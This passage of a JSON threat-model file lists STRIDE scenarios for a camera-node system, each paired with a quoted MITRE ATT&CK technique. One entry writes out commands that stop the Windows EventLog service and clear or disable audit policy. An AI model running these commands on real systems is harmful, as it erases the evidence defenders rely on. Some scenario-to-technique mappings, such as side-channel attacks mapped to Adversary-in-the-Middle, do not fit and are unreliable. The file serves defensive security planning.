tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
                "technique_id": "T1574.011"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny triggered specific events or actions in the system.",
            "Assumptions": [
                {
                    "Assumption": "No user action validation methods (e.g., secondary confirmations).",
                    "Role": "System",
                    "Condition": "If the system lacks methods to validate user actions."
                },
                {
                    "Assumption": "Logs do not contain sufficient detail.",
                    "Role": "System",
                    "Condition": "If logs lack detailed records of actions taken."
                },
                {
                    "Assumption": "Weak identity management and traceability.",
                    "Role": "System",
                    "Condition": "If the system cannot reliably track user actions to individuals."
                }
            ],
            "Potential Impact": "Impacts overall system transparency, accountability and can allow misattributed actions to escalate.",
            "MITRE ATT&CK Keywords": [
                "user action",
                "repudiation",
                "identity",
                "logging"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to transmitted visual data.",
            "Assumptions": [
                {
                    "Assumption": "Lack of encryption for data in transit.",
                    "Role": "System",
                    "Condition": "If data is transmitted without encryption."
                },
                {
                    "Assumption": "Weak network access controls.",
                    "Role": "System",
                    "Condition": "If network allows unauthorized access to data streams."
                },
                {
                    "Assumption": "Attacker gains physical or logical access to network segments.",
                    "Role": "Attacker",
                    "Condition": "If attackers obtain access to segments where data is transmitted."
                }
            ],
            "Potential Impact": "Leads to the breach of data confidentiality, unauthorized entities gaining access to sensitive visual information.",
            "MITRE ATT&CK Keywords": [
                "data exposure",
                "information disclosure",
                "network",
                "transmission"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Accessing stored visual data without proper authorization.",
            "Assumptions": [
                {
                    "Assumption": "Stored data is not securely encrypted.",
                    "Role": "System",
                    "Condition": "If data is stored in an unencrypted form."
                },
                {
                    "Assumption": "Weak access control policies on storage systems.",
                    "Role": "System",
                    "Condition": "If storage systems have lax access controls."
                },
                {
                    "Assumption": "Exploitable vulnerabilities in storage platform.",
                    "Role": "Attacker",
                    "Condition": "If vulnerabilities exist that can be exploited to bypass security measures."
                }
            ],
            "Potential Impact": "Unauthorized access can lead to sensitive data compromise, impacting data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "data exposure",
                "information disclosure",
                "storage",
                "access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Side-channel attacks on the visual data processing nodes.",
            "Assumptions": [
                {
                    "Assumption": "Processing nodes are susceptible to side-channel attacks.",
                    "Role": "Attacker",
                    "Condition": "If the physical or logical design allows side-channel data leaks."
                },
                {
                    "Assumption": "Insufficient protections against side-channel attack vectors.",
                    "Role": "System",
                    "Condition": "If protections against such attacks are not implemented."
                },
                {
                    "Assumption": "High-value processing operations are performed on nodes.",
                    "Role": "System",
                    "Condition": "If sensitive processing activities occur on exposed nodes."
                }
            ],
            "Potential Impact": "Exposes processed data, potentially leading to unauthorized access and data confidentiality breaches.",
            "MITRE ATT&CK Keywords": [
                "side-channel",
                "information disclosure",
                "processing",
                "data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Network flooding to overwhelm camera nodes and disrupt service.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient network bandwidth management.",
                    "Role": "System",
                    "Condition": "If the network lacks bandwidth control measures."
                },
                {
                    "Assumption": "Lack of rate limiting on incoming requests.",
                    "Role": "System",
                    "Condition": "If the system does not limit the rate of incoming network requests."
                },
                {
                    "Assumption": "Nodes are easily reachable over the network.",
                    "Role": "Attacker",
                    "Condition": "If nodes can be accessed and overwhelmed in the network."
                }
            ],
            "Potential Impact": "Service disruption, causing unavailability of visual data feeds.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network flooding",
                "camera",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious firmware update causing nodes to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are not cryptographically signed.",
                    "Role": "System",
                    "Condition": "If firmware lacks signature verification."
                },
                {
                    "Assumption": "Insecure firmware distribution process.",
                    "Role": "System",
                    "Condition": "If firmware is distributed through insecure channels."
                },
                {
                    "Assumption": "Nodes auto-apply updates without validation.",
                    "Role": "System",
                    "Condition": "If nodes automatically apply updates without validation."
                }
            ],
            "Potential Impact": "Leads to system unresponsiveness and compromised availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "firmware",
                "node",
                "malicious update"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
                "technique_id": "T1542.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploiting vulnerabilities in processing nodes causing crashes.",
            "Assumptions": [
                {
                    "Assumption": "Processing nodes have exploitable software vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "If vulnerabilities are present and unpatched."
                },
                {
                    "Assumption": "Nodes lack runtime protections against crashes.",
                    "Role": "System",
                    "Condition": "If there is no runtime resilience against such exploits."
                },
                {
                    "Assumption": "Weak monitoring for signs of nodes being overwhelmed.",
                    "Role": "System",
                    "Condition": "If the system lacks robust monitoring and response setups."
                }
            ],
            "Potential Impact": "Loss of availability, resulting in system crashes and interruption of visual data processing.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "processing",
                "vulnerability",
                "crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting software vulnerabilities to gain administrative control.",
            "Assumptions": [
                {
                    "Assumption": "Software has known exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "If vulnerabilities are not patched in a timely manner."
                },
                {
                    "Assumption": "No strict least-privilege deployment.",
                    "Role": "System",
                    "Condition": "If the system does not enforce strict least-privilege rules."
                },
                {
                    "Assumption": "Lack of appropriate privilege separation mechanisms.",
                    "Role": "System",
                    "Condition": "If privilege separation isn't employed effectively."
                }
            ],
            "Potential Impact": "Gain administrative privileges, compromising system control and data integrity.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerability",
                "administrative",
                "control"
            ],
            "mitre_technique": {
                "name": "Scheduled Task",
                "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",
                "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
                "technique_id": "T1053.005"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Unauthorized code execution on camera nodes through deserialization attacks.",
            "Assumptions": [
                {
                    "Assumption": "Deserialization of untrusted data is performed.",
                    "Role": "System",
                    "Condition": "If deserialization is done without validation."
                },
                {
                    "Assumption": "Weak runtime protections on camera nodes.",
                    "Role": "System",
                    "Condition": "If nodes lack protections against runtime attacks."
                },
                {
                    "Assumption": "Vulnerable libraries are in use by camera nodes.",
                    "Role": "Attacker",
                    "Condition": "If libraries with known vulnerabilities are used."
                }
            ],
            "Potential Impact": "Leads to unauthorized code execution and elevated privileges on camera nodes.",
            "MITRE ATT&CK Keywords": [
                "code execution",
                "privilege escalation",
                "deserialization",
                "node"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious insiders escalate privileges by exploiting weak access control policies.",
            "Assumptions": [
                {
                    "Assumption": "Access control policies are inadequately enforced.",
                    "Role": "System",
                    "Condition": "If access control measures are weak."
                },
                {
                    "Assumption": "Insufficient monitoring of administrative activities.",
                    "Role": "System",
                    "Condition": "If there is a lack of monitoring on critical administrative actions."
                },
                {
                    "Assumption": "Weak segregation of duties within the administrative roles.",
                    "Role": "System",
                    "Condition": "If duties and roles are not properly segregated."
                }
            ],
            "Potential Impact": "Allows insiders to escalate privileges, affecting system integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "insider threat",
                "access control",
                "monitoring"
            ],
            "mitre_technique": {
                "name": "Windows File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",
                "id": "attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee",
                "technique_id": "T1222.001"
            }
        }
    ]
}
]